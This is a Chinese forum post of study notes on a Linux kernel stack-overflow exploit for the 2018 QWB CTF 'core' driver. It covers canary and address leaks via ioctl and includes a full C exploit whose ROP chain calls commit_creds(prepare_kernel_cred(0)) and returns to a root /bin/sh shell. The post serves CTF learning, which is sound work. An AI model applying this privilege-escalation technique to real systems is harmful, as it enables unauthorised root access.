
# [原创]Linux Kernel Pwn 学习笔记(栈溢出)

# 0x01 背景

栈溢出是最基本的一个漏洞，学习 pwn 从栈溢出开始学习是比较简单的入门方式。之前也研究过 linux 内核，但因为种种原因不得不放弃。现在跟着安卓版主学习了几天linux内核漏洞，收获了不少知识，开始自己梳理和分享自己的笔记，特此感谢版主老师的教导

# 0x02 内核基本知识

Canary: 是防止栈溢出的保护，一般在`ebp-0x8`的位置，学习 linux pwn 的基本知识，不细讲

KASLR：地址随机化，类似 ASLR

SMAP：内核保护机制，内核态不可使用用户态的数据

SMEP：内核保护机制，内核态不可执行用户的代码

`commit_creds(prepare_kernel_cred(0))` :获得 root权限功能函数

`file_operations`: Linux使用`file_operations`结构访问驱动程序的函数,这个结构的每一个成员的名字都对应着一个调用`ioctl`系统调用来控制设备

## 获取基址

`vmlinux_base`: 内核加载基址,有了这个可以绕过`kaslr`实现内核的其他函数

> 获取方式:`head /proc/kallsyms 1`,`startup`对应的地址就是基址

![](https://bbs.kanxue.com/upload/attach/202008/855782_XBS7QST3KQT86UF.png)

`core_base`:驱动加载基地址

> 查看基地址方式
> `cat /proc/modules`
> `cat /proc/devices`
> `cat /proc/kallsyms`
> `lsmod`
> `dmesg`

![](https://bbs.kanxue.com/upload/attach/202008/855782_MAS5Z4NUJNUMBD7.png)

# 0x03 分析代码

**题目:2018 强网杯CTF pwncore**

## 保护机制

从`checksec`我们可以知道开启`canary`和`nx enable`

![](https://bbs.kanxue.com/upload/attach/202008/855782_YFJV8NFJY8UQY82.png)

在`start.sh`可以看到内核没有开启`smep`和`smap`，但开启`kaslr`

![](https://bbs.kanxue.com/upload/attach/202008/855782_XDV4MQJP4J24JTG.png)

## 程序逻辑

### ioctl

首先是`ioctl`,通过`ioctl`可以实现`core_read`和修改`off`和`core_copy_func`三个功能，我们可以控制`ioctl`的三个参数，就是`arg1(a1)`,`arg2`,`arg3`

![](https://bbs.kanxue.com/upload/attach/202008/855782_84ZRS8QVYZNQ95U.png)

### core_read

通过`ioctl`我们可以知道`core_read`的两个参数对应着`arg3`和`arg2`,这里有个泄漏栈地址的漏洞`copy_to_user`,该函数功能是从`v6+off`开始的位置读取64个字符到`arg3`中，通过这个函数可以将栈上`v6+off`到`v6+off+0x64`的栈空间传递到我们的`buff`,即可泄漏`canary`和`vmlinux_base`以及`core_base`,方便我们构造ROP chain。

![](https://bbs.kanxue.com/upload/attach/202008/855782_R2SBNJ9MV2KUMTR.png)

### core_write

`core_write`函数这里`copy_from_user`可以让我们写`name`,限制字符数是`0x800`

![](https://bbs.kanxue.com/upload/attach/202008/855782_RZ2U8NMCJ9XVB6P.png)

### core_copy_func

这里注意到`qmemcpy`,`v2`是`rbp-50h`的地方，可是`name`是我们控制的变量，并且可以写`0x800`个字符，那么我们可以这里进行栈溢出劫持控制流

![](https://bbs.kanxue.com/upload/attach/202008/855782_KZ5FXN4V682FHD2.png)

### 如何编写EXP

编写EXP的时候我们需要注意，进入内核时需要保存当前进程的环境,同时在`init_module`里面有个`core_proc = proc_create("core", 438LL, 0LL, &core_fops);`

`core_fops`是`file_operations`的结构体，它是linux调用的时候指定的函数，驱动加载的时候调用了`init_module`,导致我们写的一些函数都指向了驱动中的函数。这里注册了`core_write`、`core_ioctl`、`core_release`,通过这个结构体我们调用`write`就是调用`core_write`,`ioctl`就是调用`core_ioctl`.知道这些才能正确地编写exp，exp对应函数调用如下：

```c
void core_read(char *buf){
    ioctl(fd,0x6677889B,buf);
}
void change_off(long long v1){
    ioctl(fd,0x6677889c,v1);
}
void core_write(char *buf,int a3){
    write(fd,buf,a3);
}
void core_copy_func(long long size){
    ioctl(fd,0x6677889a,size);
}
```

#### rop编写

rop思路流程：

1. 用`canary`绕过`canary`保护
2. 调用`commit_creds(prepare_kernel_cred(0))`提权
3. 回到用户态进行调用`system("/bin/sh")`来getshell
4. 最后修复环境。

> 注：建议用`ropper`找ROP，不然`ROPgadget`太慢

```c
for(i = 0;i < 8;i++){
    rop[i] = 0x66666666; //offset
}
rop[i++] = canary; //canary
rop[i++] = 0; //rbp(junk)
rop[i++] = vmlinux_base + 0xb2f; //pop_rdi_ret;
rop[i++] = 0; //rdi
rop[i++] = prepare_kernel_cred_addr;
rop[i++] = vmlinux_base + 0xa0f49; //pop_rdx_ret
rop[i++] = vmlinux_base + 0x21e53; //pop_rcx_ret
rop[i++] = vmlinux_base + 0x1aa6a; //mov_rdi_rax_call_rdx
rop[i++] = commit_creds_addr;
rop[i++] = core_base + 0xd6; //swapgs_ret
rop[i++] = 0; //rbp(junk)
rop[i++] = vmlinux_base + 0x50ac2; //iretp_ret
rop[i++] = (size_t)shell;
rop[i++] = user_cs;
rop[i++] = user_eflags;
rop[i++] = user_sp;
rop[i++] = user_ss;
```

### EXP代码如下

EXP程序流程：

1. 就是`set_off`设置`off`的值
2. 然后调用`read`泄漏地址
3. 在调用`write`写`rop`
4. 最后调用`core_copy_func`实现栈溢出劫持控制流`get_shell()`

```c
//rop.c
//gcc rop.c -o poc -w -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int fd;
void core_read(char *buf){
    ioctl(fd,0x6677889B,buf);
    //printf("[*]The buf is:%x\n",buf);
}
void change_off(long long v1){
    ioctl(fd,0x6677889c,v1);
}
void core_write(char *buf,int a3){
    write(fd,buf,a3);
}
void core_copy_func(long long size){
    ioctl(fd,0x6677889a,size);
}
void shell(){
    system("/bin/sh");
}
unsigned long user_cs, user_ss, user_eflags,user_sp ;
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}
int main(){
    int ret,i;
    char buf[0x100];
    size_t vmlinux_base,core_base,canary;
    size_t commit_creds_addr,prepare_kernel_cred_addr;
    size_t commit_creds_offset = 0x9c8e0;
    size_t prepare_kernel_cred_offset = 0x9cce0;
    size_t rop[0x100];
    save_stats();
    fd = open("/proc/core",O_RDWR);
    change_off(0x40);
    core_read(buf);
    /*
    for(i=0;i<0x40;i++){
        printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
    }
    */
    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1; //0x1dd6d1
    core_base = *(size_t *)(&buf[0x10]) - 0x19b;
    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;
    commit_creds_addr = vmlinux_base + commit_creds_offset;
    canary = *(size_t *)(&buf[0]);
    printf("[*]canary:%p\n",canary);
    printf("[*]vmlinux_base:%p\n",vmlinux_base);
    printf("[*]core_base:%p\n",core_base);
    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);
    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);
    //junk
    for(i = 0;i < 8;i++){
        rop[i] = 0x66666666; //offset
    }
    rop[i++] = canary; //canary
    rop[i++] = 0; //rbp(junk)
    rop[i++] = vmlinux_base + 0xb2f; //pop_rdi_ret;
    rop[i++] = 0; //rdi
    rop[i++] = prepare_kernel_cred_addr;
    rop[i++] = vmlinux_base + 0xa0f49; //pop_rdx_ret
    rop[i++] = vmlinux_base + 0x21e53; //pop_rcx_ret
    rop[i++] = vmlinux_base + 0x1aa6a; //mov_rdi_rax_call_rdx
    rop[i++] = commit_creds_addr;
    rop[i++] = core_base + 0xd6; //swapgs_ret
    rop[i++] = 0; //rbp(junk)
    rop[i++] = vmlinux_base + 0x50ac2; //iretp_ret
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    core_write(rop,0x100);
    core_copy_func(0xf000000000000100);
    return 0;
}
```

# 0x04 总结

这是我进入 Linux Kernel pwn 的敲门砖，自己当时听完觉得有点迷糊，看了代码的时候觉得很简单，但是当自己敲的时候又有很多问题不懂，只有当敲完一遍，把程序流程梳理了之后很多地方都清晰了。Linux 内核是很大的世界，要想完全理解，还要深入研究

题目下载地址：<mark class="encrypted">6a3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6h3K9h3&6S2k6r3W2S2K9#2)9J5c8V1I4A6L8Y4g2^5d9$3g2J5L8X3g2D9f1s2N6F1</mark>
